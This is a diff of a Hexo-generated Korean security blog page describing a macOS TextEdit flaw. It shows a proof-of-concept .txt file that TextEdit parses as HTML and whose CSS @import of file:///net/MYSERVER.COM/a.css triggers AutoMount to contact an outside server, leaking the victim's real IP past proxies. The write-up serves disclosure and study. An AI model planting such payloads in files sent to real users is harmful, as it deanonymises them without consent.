@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      209 자
+      353 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      7
        분
     </span>
   
@@ -244,21 +244,21 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>macOS</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOS에서 TextEdit를 통해 확장자명이 txt임에도 불구하고 RTF-HTML 파일로 실행할 수 있는 취약점이 발견되었습니다.</p>
-<p>만약 txt 파일이 다음과 같이 시작하면, txt 파일임에도 HTML 파싱을 합니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOS&#xC5D0;&#xC11C; TextEdit&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC7A5;&#xC790;&#xBA85;&#xC774; txt&#xC784;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; RTF-HTML &#xD30C;&#xC77C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xB9CC;&#xC57D; txt &#xD30C;&#xC77C;&#xC774; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2DC;&#xC791;&#xD558;&#xBA74;, txt &#xD30C;&#xC77C;&#xC784;&#xC5D0;&#xB3C4; HTML &#xD30C;&#xC2F1;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</code></pre>
 
-<p>다음과 같은 CSS 속성이 로컬 CSS 파일을 로드합니다.</p>
-<pre><code class="hljs python">&lt;style&gt; @import &#123; &quot;url &quot; &#125; &lt;/stymle&gt;</code></pre>
+<p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; CSS &#xC18D;&#xC131;&#xC774; &#xB85C;&#xCEEC; CSS &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs python">&lt;style&gt; @import { &quot;url &quot; } &lt;/stymle&gt;</code></pre>
 
-<p>하지만 작동하는 scheme은 <code>file://</code>입니다. 이를 통해 외부 요청은 할 수 없지만 로컬에 저장된 다른 로컬 파일을  열 수 있습니다.  OSX의 AutoMount 기능을 통해 원격 요청을 할 수 있습니다. <code>ls /net/EXAMPLE.com</code>을 수행하면 OSX가 <code>EXAMPLE.com</code>에 원격 요청을 보냅니다. TextEdit에서 외부 요청을 못하도록 차단하였지만 <code>file://</code> scheme를 통해 <code>MYSERVER.COM</code>에 접근할 수 있습니다. <code>MYSERVER.COM</code>에 접근하는 코드는 다음과 같습니다.</p>
+<p>&#xD558;&#xC9C0;&#xB9CC; &#xC791;&#xB3D9;&#xD558;&#xB294; scheme&#xC740; <code>file://</code>&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC740; &#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; &#xB85C;&#xCEEC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB2E4;&#xB978; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;&#xC744;  &#xC5F4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  OSX&#xC758; AutoMount &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xC694;&#xCCAD;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ls /net/EXAMPLE.com</code>&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; OSX&#xAC00; <code>EXAMPLE.com</code>&#xC5D0; &#xC6D0;&#xACA9; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. TextEdit&#xC5D0;&#xC11C; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC744; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xCC28;&#xB2E8;&#xD558;&#xC600;&#xC9C0;&#xB9CC; <code>file://</code> scheme&#xB97C; &#xD1B5;&#xD574; <code>MYSERVER.COM</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>MYSERVER.COM</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;
 
-&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;style&gt;@import&#123; &quot;file:///net/MYSERVER.COM/a.css&quot;&#125; &lt;/style&gt;
+&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;style&gt;@import{ &quot;file:///net/MYSERVER.COM/a.css&quot;} &lt;/style&gt;
 
 I know where you are...&lt;/body&gt;&lt;/html&gt;</code></pre>
 
-<p>AutoMount는 커널을 사용하여 TCP 연결을 하므로 프록시를 사용하더라도 실제 IP 주소를 알 수 있습니다.</p>
+<p>AutoMount&#xB294; &#xCEE4;&#xB110;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; TCP &#xC5F0;&#xACB0;&#xC744; &#xD558;&#xBBC0;&#xB85C; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC2E4;&#xC81C; IP &#xC8FC;&#xC18C;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 
             </div>
             <hr>
@@ -559,6 +559,45 @@ I know where you are...&lt;/body&gt;&lt;/html&gt;</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
